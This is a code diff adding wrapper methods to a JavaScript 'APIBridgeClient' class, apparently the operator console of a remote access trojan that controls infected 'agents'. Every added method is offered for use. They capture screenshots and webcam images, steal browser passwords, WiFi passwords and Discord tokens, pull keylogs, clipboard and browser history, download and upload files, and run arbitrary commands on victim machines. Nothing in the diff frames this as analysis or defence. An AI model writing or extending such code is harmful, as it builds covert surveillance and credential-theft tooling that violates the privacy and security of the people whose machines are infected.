@@ -238,4 +238,266 @@ export class APIBridgeClient {
       return { error: error.message };
     }
   }
+
+  // ═══════════════════════════════════════════════════════════════
+  // COMPATIBILITY METHODS - Wraps executeCommand for specific operations
+  // ═══════════════════════════════════════════════════════════════
+
+  /**
+   * Get screenshot from agent
+   */
+  async getScreenshot(agentId) {
+    const result = await this.executeCommand(agentId, 'screenshot');
+    return {
+      success: !result.error,
+      image: result.data?.image || result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get webcam from agent
+   */
+  async getWebcam(agentId) {
+    const result = await this.executeCommand(agentId, 'webcam');
+    return {
+      success: !result.error,
+      image: result.data?.image || result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get system info from agent
+   */
+  async getSystemInfo(agentId) {
+    const result = await this.executeCommand(agentId, 'sysinfo');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get processes from agent
+   */
+  async getProcesses(agentId) {
+    const result = await this.executeCommand(agentId, 'processes');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get metrics from agent
+   */
+  async getMetrics(agentId) {
+    const result = await this.executeCommand(agentId, 'metrics');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get software/programs from agent
+   */
+  async getSoftware(agentId) {
+    const result = await this.executeCommand(agentId, 'software');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Kill process on agent
+   */
+  async killProcess(agentId, pid) {
+    const result = await this.executeCommand(agentId, `kill ${pid}`);
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Network scan on agent
+   */
+  async networkScan(agentId) {
+    const result = await this.executeCommand(agentId, 'netscan');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get geolocation of agent
+   */
+  async getGeolocation(agentId) {
+    const result = await this.executeCommand(agentId, 'locate');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Enumerate USB devices on agent
+   */
+  async enumerateUSB(agentId) {
+    const result = await this.executeCommand(agentId, 'usb');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get browser passwords from agent
+   */
+  async getPasswords(agentId) {
+    const result = await this.executeCommand(agentId, 'passwords');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get WiFi passwords from agent
+   */
+  async getWiFiPasswords(agentId) {
+    const result = await this.executeCommand(agentId, 'wifi');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get Discord tokens from agent
+   */
+  async getDiscordTokens(agentId) {
+    const result = await this.executeCommand(agentId, 'discord');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get browser history from agent
+   */
+  async getBrowserHistory(agentId, browser = 'chrome') {
+    const result = await this.executeCommand(agentId, `history ${browser}`);
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Download file from agent
+   */
+  async downloadFile(agentId, filepath) {
+    const result = await this.executeCommand(agentId, `download ${filepath}`);
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Upload file to agent
+   */
+  async uploadFile(agentId, targetPath, fileBuffer) {
+    try {
+      const response = await fetch(`${this.baseUrl}/command/upload`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          agent_id: agentId,
+          target_path: targetPath,
+          file_data: fileBuffer.toString('base64')
+        }),
+        timeout: this.timeout
+      });
+      const data = await response.json();
+      return {
+        success: !data.error,
+        data: data.data,
+        error: data.error
+      };
+    } catch (error) {
+      return { success: false, error: error.message };
+    }
+  }
+
+  /**
+   * Get keylogs from agent
+   */
+  async getKeylogs(agentId) {
+    const result = await this.executeCommand(agentId, 'keylogs');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get clipboard from agent
+   */
+  async getClipboard(agentId) {
+    const result = await this.executeCommand(agentId, 'clipboard');
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Send command to agent
+   */
+  async sendCommand(agentId, command, timeout = 30000) {
+    const result = await this.executeCommand(agentId, command);
+    return {
+      success: !result.error,
+      data: result.data,
+      error: result.error
+    };
+  }
+
+  /**
+   * Get all sessions (legacy compatibility)
+   */
+  async getSessions() {
+    const response = await this.listAgents();
+    return response.agents || [];
+  }
+
+  /**
+   * Set active session (no-op in REST API)
+   */
+  setActiveSession(sessionId) {
+    // No-op in REST API - agents are managed by ID
+  }
 }
+
